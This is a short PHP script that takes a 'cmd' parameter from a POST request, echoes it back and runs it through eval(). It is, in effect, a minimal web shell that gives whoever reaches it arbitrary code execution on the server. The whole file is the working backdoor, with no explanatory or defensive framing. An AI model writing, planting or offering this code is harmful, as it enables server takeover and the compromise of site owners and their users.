<?php
$cmd = $_POST['cmd'];
$cmd = stripslashes($cmd);
echo 'The php code <b>'.$cmd.'</b> as been executed.<br>';
eval($cmd);
?>